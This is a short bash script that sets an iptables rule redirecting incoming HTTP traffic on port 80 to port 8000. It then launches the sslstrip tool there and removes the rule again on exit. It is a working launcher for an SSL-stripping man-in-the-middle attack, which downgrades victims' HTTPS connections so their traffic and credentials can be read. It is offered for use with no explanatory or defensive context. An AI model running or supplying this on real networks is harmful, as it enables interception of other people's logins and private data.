#!/bin/bash

trap 'terminate' INT TERM QUIT

terminate() {
    echo "[*] Restoring IP tables after strip..."
    sudo iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8000
    wait
}

BASEDIR=$(dirname -- "$(readlink -f -- "${BASH_SOURCE}")")

sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8000
python $BASEDIR/sslstrip-0.9/sslstrip.py -l 8000
